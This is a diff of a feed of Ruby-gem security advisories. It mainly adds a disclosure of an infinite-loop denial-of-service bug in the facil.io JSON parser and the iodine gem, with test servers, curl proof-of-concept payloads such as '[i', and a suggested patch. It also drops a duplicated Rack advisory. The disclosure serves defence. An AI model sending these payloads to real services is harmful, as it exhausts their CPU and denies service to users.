@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/rubygems.rss</id>
     <title>Security Advisory for Ruby gems hosted at RubyGems.org</title>
-    <updated>2026-04-14T23:13:48.255Z</updated>
+    <updated>2026-04-15T00:17:12.149Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arubygems"/>
     <subtitle>Security Advisory for Ruby gems hosted at RubyGems.org on GitHub</subtitle>
@@ -11,6 +11,196 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[iodine] Uncontrolled resource consumption and loop with unreachable exit condition in facil.io and downstream iodine ruby gem]]></title>
+        <id>https://github.com/advisories/GHSA-2x79-gwq3-vxxm</id>
+        <link href="https://github.com/advisories/GHSA-2x79-gwq3-vxxm"/>
+        <updated>2026-04-14T23:41:07.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>fio_json_parse</code> can enter an infinite loop when it encounters a nested JSON value starting with <code>i</code> or <code>I</code>. The process spins in user space and pegs one CPU core at ~100% instead of returning a parse error. Because <code>iodine</code> vendors the same parser code, the issue also affects <code>iodine</code> when it parses attacker-controlled JSON.</p>
+<p>The smallest reproducer found is <code>[i</code>. The quoted-value form that originally exposed the issue, <code>[""i</code>, reaches the same bug because the parser tolerates missing commas and then treats the trailing <code>i</code> as the start of another value.</p>
+<h3 id="details">Details</h3>
+<p>The vulnerable logic is in <code>lib/facil/fiobj/fio_json_parser.h</code> around the numeral handling block (<code>0.7.5</code> / <code>0.7.6</code>: lines <code>434-468</code>; <code>master</code>: lines <code>434-468</code> in the current tree as tested).</p>
+<p>This parser is reached from real library entry points, not just the header in isolation:</p>
+<ul>
+<li><code>facil.io</code>: <code>lib/facil/fiobj/fiobj_json.c:377-387</code> (<code>fiobj_json2obj</code>) and <code>402-411</code> (<code>fiobj_hash_update_json</code>)</li>
+<li><code>iodine</code>: <code>ext/iodine/iodine_json.c:161-177</code> (<code>iodine_json_convert</code>)</li>
+<li><code>iodine</code>: <code>ext/iodine/fiobj_json.c:377-387</code> and <code>402-411</code></li>
+</ul>
+<p>Relevant flow:</p>
+<ol>
+<li>Inside an array or object, the parser sees <code>i</code> or <code>I</code> and jumps to the <code>numeral:</code> label.</li>
+<li>It calls <code>fio_atol((char **)&amp;tmp)</code>.</li>
+<li>For a bare <code>i</code> / <code>I</code>, <code>fio_atol</code> consumes zero characters and leaves <code>tmp == pos</code>.</li>
+<li>The current code only falls back to float parsing when <code>JSON_NUMERAL[*tmp]</code> is true.</li>
+<li><code>JSON_NUMERAL['i'] == 0</code>, so the parser incorrectly accepts the value as an integer and sets <code>pos = tmp</code> without advancing.</li>
+<li>Because parsing is still nested (<code>parser-&gt;depth &gt; 0</code>), the outer loop continues forever with the same <code>pos</code>.</li>
+</ol>
+<p>The same logic exists in <code>iodine</code>'s vendored copy at <code>ext/iodine/fio_json_parser.h</code> lines <code>434-468</code>.</p>
+<p>Why the <code>[""i</code> form hangs:</p>
+<ol>
+<li>The parser accepts the empty string <code>""</code> as the first array element.</li>
+<li>It does not require a comma before the next token.</li>
+<li>The trailing <code>i</code> is then parsed as a new nested value.</li>
+<li>The zero-progress numeral path above causes the infinite loop.</li>
+</ol>
+<p>Examples that trigger the bug:</p>
+<ul>
+<li>Array form, minimal: <code>[i</code></li>
+<li>Object form: <code>{"a":i</code></li>
+<li>After a quoted value in an array: <code>[""i</code></li>
+<li>After a quoted value in an object: <code>{"a":""i</code></li>
+</ul>
+<h2 id="poc">PoC</h2>
+<p>Environment used for verification:</p>
+<ul>
+<li><code>facil.io</code> commit: <code>162df84001d66789efa883eebb0567426d00148e</code></li>
+<li><code>iodine</code> commit: <code>5bebba698d69023cf47829afe51052f8caa6c7f8</code></li>
+<li>standalone compile against <code>fio_json_parser.h</code></li>
+</ul>
+<h3 id="minimal-standalone-program">Minimal standalone program</h3>
+<p>Use the normal HTTP stack. The following server calls <code>http_parse_body(h)</code>, which reaches <code>fiobj_json2obj</code> and then <code>fio_json_parse</code> for <code>Content-Type: application/json</code>.</p>
+<pre><code class="language-c">#define _POSIX_C_SOURCE 200809L
+
+#include &lt;stdio.h&gt;
+#include &lt;time.h&gt;
+#include &lt;fio.h&gt;
+#include &lt;http.h&gt;
+
+static void on_request(http_s *h) {
+  fprintf(stderr, "calling http_parse_body\n");
+  fflush(stderr);
+  http_parse_body(h);
+  fprintf(stderr, "returned from http_parse_body\n");
+  http_send_body(h, "ok\n", 3);
+}
+
+int main(void) {
+  if (http_listen("3000", "127.0.0.1",
+                  .on_request = on_request,
+                  .max_body_size = (1024 * 1024),
+                  .log = 1) == -1) {
+    perror("http_listen");
+    return 1;
+  }
+  fio_start(.threads = 1, .workers = 1);
+  return 0;
+}
+</code></pre>
+<p><code>http_parse_body(h)</code> is the higher-level entry point and, for <code>Content-Type: application/json</code>, it reaches <code>fiobj_json2obj</code> in <code>lib/facil/http/http.c:1947-1953</code>.</p>
+<p>Save it as <code>src/main.c</code> in a vulnerable <code>facil.io</code> checkout and build it with the repo <code>makefile</code>:</p>
+<pre><code class="language-bash">git checkout 0.7.6
+mkdir -p src
+make NAME=http_json_poc
+</code></pre>
+<p>Run:</p>
+<pre><code class="language-bash">./tmp/http_json_poc
+</code></pre>
+<p>Then in another terminal send one of these payloads:</p>
+<pre><code class="language-bash">printf '[i' | curl --http1.1 -H 'Content-Type: application/json' -X POST --data-binary @- http://127.0.0.1:3000/
+printf '{"a":i' | curl --http1.1 -H 'Content-Type: application/json' -X POST --data-binary @- http://127.0.0.1:3000/
+printf '[""i' | curl --http1.1 -H 'Content-Type: application/json' -X POST --data-binary @- http://127.0.0.1:3000/
+printf '{"a":""i' | curl --http1.1 -H 'Content-Type: application/json' -X POST --data-binary @- http://127.0.0.1:3000/
+</code></pre>
+<p>Observed result on a vulnerable build:</p>
+<ul>
+<li>The server prints <code>calling http_parse_body</code> and never reaches <code>returned from http_parse_body</code>.</li>
+<li>The request never completes.</li>
+<li>One worker thread spins until the process is killed.</li>
+</ul>
+<h3 id="downstream-impact-in-iodine">Downstream impact in <code>iodine</code></h3>
+<p><code>iodine</code> vendors the same parser implementation in <code>ext/iodine/fio_json_parser.h</code>, so any <code>iodine</code> code path that parses attacker-controlled JSON through this parser inherits the same hang / CPU exhaustion behavior.</p>
+<p>Single-file <code>iodine</code> HTTP server repro:</p>
+<pre><code class="language-ruby">require "iodine"
+
+APP = proc do |env|
+  body = env["rack.input"].read.to_s
+  warn "calling Iodine::JSON.parse on: #{body.inspect}"
+  Iodine::JSON.parse(body)
+  warn "returned from Iodine::JSON.parse"
+  [200, { "Content-Type" =&gt; "text/plain", "Content-Length" =&gt; "3" }, ["ok\n"]]
+end
+
+Iodine.listen service: :http,
+              address: "127.0.0.1",
+              port: "3000",
+              handler: APP
+
+Iodine.threads = 1
+Iodine.workers = 1
+Iodine.start
+</code></pre>
+<p>Run:</p>
+<pre><code class="language-bash">ruby iodine_json_parse_http_poc.rb
+</code></pre>
+<p>Then in a second terminal:</p>
+<pre><code class="language-bash">printf '[i' | curl --http1.1 -X POST --data-binary @- http://127.0.0.1:3000/
+printf '{"a":i' | curl --http1.1 -X POST --data-binary @- http://127.0.0.1:3000/
+printf '[""i' | curl --http1.1 -X POST --data-binary @- http://127.0.0.1:3000/
+printf '{"a":""i' | curl --http1.1 -X POST --data-binary @- http://127.0.0.1:3000/
+</code></pre>
+<p>On a vulnerable build, the server prints the <code>calling Iodine::JSON.parse...</code> line but never prints the <code>returned from Iodine::JSON.parse</code> line for these payloads.</p>
+<h2 id="impact">Impact</h2>
+<p>This is a denial-of-service issue. An attacker who can supply JSON to an affected parser path can cause the process to spin indefinitely and consume CPU at roughly 100% of one core. In practice, the impact depends on whether an application exposes parser access to untrusted clients, but for services that do, a single crafted request can tie up a worker or thread until it is killed or restarted.</p>
+<p>I would describe the impact as:</p>
+<ul>
+<li>Availability impact: high for affected parser entry points</li>
+<li>Confidentiality impact: none observed</li>
+<li>Integrity impact: none observed</li>
+</ul>
+<h2 id="suggested-patch">Suggested Patch</h2>
+<p>Treat zero-consumption numeric parses as failures before accepting the token.</p>
+<pre><code class="language-diff">diff --git a/lib/facil/fiobj/fio_json_parser.h b/lib/facil/fiobj/fio_json_parser.h
+@@
+       uint8_t *tmp = pos;
+       long long i = fio_atol((char **)&amp;tmp);
+       if (tmp &gt; limit)
+         goto stop;
+-      if (!tmp || JSON_NUMERAL[*tmp]) {
++      if (!tmp || tmp == pos || JSON_NUMERAL[*tmp]) {
+         tmp = pos;
+         double f = fio_atof((char **)&amp;tmp);
+         if (tmp &gt; limit)
+           goto stop;
+-        if (!tmp || JSON_NUMERAL[*tmp])
++        if (!tmp || tmp == pos || JSON_NUMERAL[*tmp])
+           goto error;
+         fio_json_on_float(parser, f);
+         pos = tmp;
+</code></pre>
+<p>This preserves permissive <code>inf</code> / <code>nan</code> handling when the float parser actually consumes input, but rejects bare <code>i</code> / <code>I</code> tokens that otherwise leave the cursor unchanged.</p>
+<p>The same change should be mirrored to <code>iodine</code>'s vendored copy:</p>
+<ul>
+<li><code>ext/iodine/fio_json_parser.h</code></li>
+</ul>
+<h2 id="impact-1">Impact</h2>
+<ul>
+<li><code>facil.io</code><ul>
+<li>Verified on <code>master</code> commit <code>162df84001d66789efa883eebb0567426d00148e</code> (<code>git describe</code>: <code>0.7.5-24-g162df840</code>)</li>
+<li>Verified on tagged releases <code>0.7.5</code> and <code>0.7.6</code></li>
+</ul>
+</li>
+<li><code>iodine</code> Ruby gem<ul>
+<li>Verified on repo commit <code>5bebba698d69023cf47829afe51052f8caa6c7f8</code></li>
+<li>Verified on tag / gem version <code>v0.7.58</code></li>
+<li>The gem vendors a copy of the vulnerable parser in <code>ext/iodine/fio_json_parser.h</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/boazsegev/facil.io/security/advisories/GHSA-2x79-gwq3-vxxm">https://github.com/boazsegev/facil.io/security/advisories/GHSA-2x79-gwq3-vxxm</a></li>
+<li><a href="https://github.com/advisories/GHSA-2x79-gwq3-vxxm">https://github.com/advisories/GHSA-2x79-gwq3-vxxm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2x79-gwq3-vxxm</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-14T23:41:06.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[decidim-api] Decidim's comments API allows access to all commentable resources]]></title>
         <id>https://github.com/advisories/GHSA-ghmh-q25g-gxxx</id>
@@ -1122,60 +1312,6 @@ evil.com#myapp.com
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-04-02T20:36:40.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[rack] Rack has Content-Length mismatch in Rack::Files error responses]]></title>
-        <id>https://github.com/advisories/GHSA-q2ww-5357-x388</id>
-        <link href="https://github.com/advisories/GHSA-q2ww-5357-x388"/>
-        <updated>2026-04-02T20:36:11.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><code>Rack::Files#fail</code> sets the <code>Content-Length</code> response header using <code>String#size</code> instead of <code>String#bytesize</code>. When the response body contains multibyte UTF-8 characters, the declared <code>Content-Length</code> is smaller than the number of bytes actually sent on the wire.</p>
-<p>Because <code>Rack::Files</code> reflects the requested path in 404 responses, an attacker can trigger this mismatch by requesting a non-existent path containing percent-encoded UTF-8 characters.</p>
-<p>This results in incorrect HTTP response framing and may cause response desynchronization in deployments that rely on the incorrect <code>Content-Length</code> value.</p>
-<h2 id="details">Details</h2>
-<p><code>Rack::Files#fail</code> constructs error responses using logic equivalent to:</p>
-<pre><code class="language-ruby">def fail(status, body, headers = {})
-  body += "\n"
-  [
-    status,
-    {
-      "content-type" =&gt; "text/plain",
-      "content-length" =&gt; body.size.to_s,
-      "x-cascade" =&gt; "pass"
-    }.merge!(headers),
-    [body]
-  ]
-end
-</code></pre>
-<p>Here, <code>body.size</code> returns the number of characters, not the number of bytes. For multibyte UTF-8 strings, this produces an incorrect <code>Content-Length</code> value.</p>
-<p><code>Rack::Files</code> includes the decoded request path in 404 responses. A request containing percent-encoded UTF-8 path components therefore causes the response body to contain multibyte characters, while the <code>Content-Length</code> header still reflects character count rather than byte count.</p>
-<p>As a result, the server can send more bytes than declared in the response headers.</p>
-<p>This violates HTTP message framing requirements, which define <code>Content-Length</code> as the number of octets in the message body.</p>
-<h2 id="impact">Impact</h2>
-<p>Applications using <code>Rack::Files</code> may emit incorrectly framed error responses when handling requests for non-existent paths containing multibyte characters.</p>
-<p>In some deployment topologies, particularly with keep-alive connections and intermediaries that rely on <code>Content-Length</code>, this mismatch may lead to response parsing inconsistencies or response desynchronization. The practical exploitability depends on the behavior of downstream proxies, clients, and connection reuse.</p>
-<p>Even where no secondary exploitation is possible, the response is malformed and may trigger protocol errors in strict components.</p>
-<h2 id="mitigation">Mitigation</h2>
-<ul>
-<li>Update to a patched version of Rack that computes <code>Content-Length</code> using <code>String#bytesize</code>.</li>
-<li>Avoid exposing <code>Rack::Files</code> directly to untrusted traffic until a fix is available, if operationally feasible.</li>
-<li>Where possible, place Rack behind a proxy or server that normalizes or rejects malformed backend responses.</li>
-<li>Prefer closing backend connections on error paths if response framing anomalies are a concern.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/rack/rack/security/advisories/GHSA-q2ww-5357-x388">https://github.com/rack/rack/security/advisories/GHSA-q2ww-5357-x388</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34831">https://nvd.nist.gov/vuln/detail/CVE-2026-34831</a></li>
-<li><a href="https://github.com/advisories/GHSA-q2ww-5357-x388">https://github.com/advisories/GHSA-q2ww-5357-x388</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-q2ww-5357-x388</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-04-02T20:36:10.000Z</published>
     </entry>
     <entry>
         <title type="html"><![CDATA[[rack] Rack has Content-Length mismatch in Rack::Files error responses]]></title>
